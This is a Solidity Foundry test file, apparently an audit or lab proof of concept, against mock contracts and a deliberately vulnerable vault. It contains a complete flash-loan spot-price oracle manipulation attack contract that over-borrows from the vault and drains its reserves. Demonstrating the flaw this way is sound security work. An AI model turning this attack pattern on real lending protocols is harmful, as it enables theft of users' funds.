// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {MockDEXPair} from "../contracts/mocks/MockDEXPair.sol";
import {MockFlashLender, IFlashBorrower} from "../contracts/mocks/MockFlashLender.sol";
import {VulnOracleVault, ISpotPair, IMintableToken} from "../contracts/targets/VulnOracleVault.sol";

/// Attacker: flash-borrow payout token, spike the AMM spot price with a large swap,
/// borrow against inflated collateral value, unwind, repay. One transaction.
contract OracleManipAttacker is IFlashBorrower {
    MockDEXPair pair;
    MockFlashLender lender;
    MockERC20 collateral; // token0
    MockERC20 payout;     // token1
    VulnOracleVault vault;
    uint256 public borrowed;
    uint256 public flashAmount;
    uint256 public ownCollateral;

    constructor(
        MockDEXPair _pair,
        MockFlashLender _lender,
        MockERC20 _collateral,
        MockERC20 _payout,
        VulnOracleVault _vault
    ) {
        pair = _pair;
        lender = _lender;
        collateral = _collateral;
        payout = _payout;
        vault = _vault;
    }

    function attack(uint256 _flashAmount) external {
        flashAmount = _flashAmount;
        ownCollateral = collateral.balanceOf(address(this)); // snapshot our real collateral
        lender.flashLoan(_flashAmount); // borrow payout token
    }

    function onFlashLoan(address, uint256 amount) external {
        // 1) Spike spot price: swap payout(token1) -> collateral(token0).
        payout.approve(address(pair), amount);
        pair.swap(false, amount);

        // 2) Deposit ONLY our modest real collateral, now valued at the inflated price.
        //    (The swap output is kept aside to unwind and repay the flash loan.)
        collateral.approve(address(vault), ownCollateral);
        vault.deposit(ownCollateral);

        // 3) Borrow against the manipulated valuation.
        borrowed = vault.maxBorrow(address(this));
        if (borrowed > payout.balanceOf(address(vault))) borrowed = payout.balanceOf(address(vault));
        vault.borrow(borrowed);

        // 4) Unwind: swap our collateral back to payout to help repay.
        uint256 c2 = collateral.balanceOf(address(this));
        collateral.approve(address(pair), c2);
        pair.swap(true, c2);

        // 5) Repay flash loan.
        payout.transfer(address(lender), amount);
    }
}

/// PoC — [VULN-5] DEX liquidity-pool / spot-price oracle manipulation.
contract DexOracleManipulationTest is Test {
    MockERC20 x100; // collateral token0
    MockERC20 usdc; // payout token1
    MockDEXPair pair;
    MockFlashLender usdcLender;
    VulnOracleVault vault;

    address deployer = address(this);

    function setUp() public {
        x100 = new MockERC20("X100", "X100");
        usdc = new MockERC20("USD Coin", "USDC");
        pair = new MockDEXPair(x100, usdc);

        // Seed balanced liquidity: 1,000,000 x100 : 1,000,000 usdc  => spot price 1.0
        x100.mint(deployer, 1_000_000e18);
        usdc.mint(deployer, 1_000_000e18);
        x100.approve(address(pair), type(uint256).max);
        usdc.approve(address(pair), type(uint256).max);
        pair.addLiquidity(1_000_000e18, 1_000_000e18);

        // Vault funded with 200,000 USDC of lendable reserves.
        vault = new VulnOracleVault(ISpotPair(address(pair)), IMintableToken(address(x100)), IMintableToken(address(usdc)));
        usdc.mint(address(vault), 200_000e18);

        // Flash lender funded with 4,000,000 USDC of simulated liquidity.
        usdcLender = new MockFlashLender(usdc);
        usdc.mint(address(usdcLender), 4_000_000e18);
    }

    function test_spot_oracle_lets_attacker_overborrow() public {
        OracleManipAttacker bot =
            new OracleManipAttacker(pair, usdcLender, x100, usdc, vault);

        // Attacker's real collateral: only 10,000 X100 (~10,000 USDC at fair price 1.0).
        x100.mint(address(bot), 10_000e18);

        // Fair borrow capacity at honest price (1.0) and 80% LTV = 8,000 USDC.
        uint256 fairMaxBorrow = (10_000e18 * 1e18 / 1e18) * 8000 / 10000;
        assertEq(fairMaxBorrow, 8_000e18, "fair capacity at honest price");
        assertEq(pair.spotPrice0(), 1e18, "honest spot price = 1.0");

        // EXPLOIT
        bot.attack(3_500_000e18);

        uint256 loot = bot.borrowed();
        console2.log("inflated maxBorrow (USDC 1e18):", loot / 1e18);
        console2.log("fair maxBorrow     (USDC 1e18):", fairMaxBorrow / 1e18);

        // EVIDENCE: the vault lent against a manipulated price, far above fair value.
        assertGt(loot, fairMaxBorrow * 5, "EVIDENCE: borrowed >5x fair collateral value");
        // EVIDENCE: vault reserves materially drained by the over-loan.
        assertLt(usdc.balanceOf(address(vault)), 200_000e18, "EVIDENCE: vault reserves drained");
        // The flash loan was repaid (else the tx would have reverted on the lender's check).
        assertGe(usdc.balanceOf(address(usdcLender)), 4_000_000e18, "flash loan repaid in full");
    }
}
